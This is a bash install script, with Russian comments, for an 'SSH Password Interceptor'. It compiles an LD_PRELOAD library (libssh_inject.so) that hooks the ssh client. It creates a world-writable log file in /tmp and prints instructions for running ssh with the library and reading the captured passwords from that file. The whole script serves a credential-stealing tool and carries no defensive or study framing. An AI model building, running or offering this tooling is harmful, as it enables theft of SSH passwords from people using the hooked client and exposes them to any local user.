#!/bin/bash

# Скрипт для локальной установки SSH Password Interceptor

# Текущая директория
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
cd "$SCRIPT_DIR" || exit 1

# Компиляция
echo "Компиляция libssh_inject.so..."
make clean
make

# Создание лог-файла
echo "Создание лог-файла /tmp/ssh_inj.dbg..."
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

echo "Установка завершена!"
echo "Для использования: LD_PRELOAD=./libssh_inject.so ssh user@server"
echo "Логи сохраняются в: /tmp/ssh_inj.dbg"

echo ""
echo "Для просмотра захваченных паролей: cat /tmp/ssh_inj.dbg"
echo "Для удаления: rm /tmp/ssh_inj.dbg && make clean" 